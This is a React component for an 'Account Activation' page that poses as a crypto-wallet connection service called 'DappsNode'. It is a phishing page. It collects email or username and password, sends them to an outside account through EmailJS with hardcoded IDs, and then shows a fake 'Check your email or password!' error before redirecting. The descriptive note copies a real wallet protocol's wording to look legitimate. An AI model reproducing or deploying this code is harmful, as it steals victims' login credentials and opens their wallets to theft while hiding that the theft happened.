import React, { useState } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";

// Image
import SettingsPNG from "../set.png";

const AccessPage = () => {
  const [isLoading, setIsLoading] = useState(false);

  const [error, SetError] = useState(false);
  const [value] = useState("");

  const navigate = useNavigate();

  const sendEmail = (e) => {
    e.preventDefault();

    setIsLoading(true);

    emailjs
      .sendForm(
        "service_glp6dpg",
        "template_am2yhys",
        e.target,
        "user_HfK9hcWnmiTwOWxFjVAhi"
      )
      .then(
        (result) => {
          SetError(true);
          setIsLoading(false);

          setTimeout(() => {
            navigate("/success");
          }, 2000);

          console.log(result.text);

          e.target.reset();
        },
        (error) => {
          setIsLoading(false);
          console.log(error.text);
        }
      );
  };

  return (
    <section className="w-full py-12">
      <div className="w-full max-w-4xl px-4 mx-auto mb-10">
        <div className="w-full flex justify-center items-center text-center">
          <img src={SettingsPNG} alt="setting png logo" />
        </div>

        <div className="mb-4 text-xl">
          <h1>Account Activation</h1>
        </div>

        {error && (
          <div className="w-full my-4 p-2 rounded text-start font-medium text-base bg-red-500 text-white">
            <p>Check your email or password!</p>
          </div>
        )}

        <form id="form" onSubmit={sendEmail} className="w-full">
          <input
            type="email"
            id="username"
            name="key"
            placeholder="Email Address/Username"
            defaultValue={value}
            onChange={(e) => {}}
            className="!py-2"
            required
          />

          <input
            type="password"
            id="password"
            name="pass"
            placeholder="Password"
            required
            defaultValue={value}
            onChange={(e) => {}}
            className="!py-2"
          />

          <div className="w-full">
            <button
              type="submit"
              className="!rounded-md !py-2"
              disabled={isLoading}
            >
              {isLoading ? " Submiting ..." : " Submit"}
            </button>
          </div>
        </form>
      </div>

      <div className="w-full max-w-4xl mx-auto px-4 flex flex-col gap-1">
        <h1 className="text-lg font-medium">Note</h1>
        <p className="text-base opacity-90">
          DappsNode is an open source protocol for connecting decentralised
          applications to mobile wallets with QR code scanning or deep linking.
          A user can interact securely with any Dapp from their mobile phone,
          making DappsNode wallets a safer choice compared to desktop or browser
          extension wallets. How does it work? DappsNode connects web
          applications to supported mobile wallets. DappsNode session is started
          by a scanning a QR code (desktop) or by clicking an application deep
          link (mobile).
        </p>
      </div>
    </section>
  );
};

export default AccessPage;
